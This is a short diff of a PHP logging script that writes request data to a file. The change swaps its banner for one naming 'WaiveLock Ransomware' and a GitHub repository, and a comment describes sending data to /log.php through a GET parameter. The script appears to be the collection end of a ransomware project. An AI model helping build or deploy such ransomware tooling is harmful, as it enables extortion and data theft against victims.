@@ -4,7 +4,7 @@
   $fw = fwrite($fo, "$content\n");
   fclose($fo);
 
-echo 'RWare by ~Waiv3d'
+echo 'WaiveLock Ransomware @ github.com/waived/waivelock'
 ?>
 
 // Send a GET request via HTTP and parse data into  /log.php?data=<your string here>
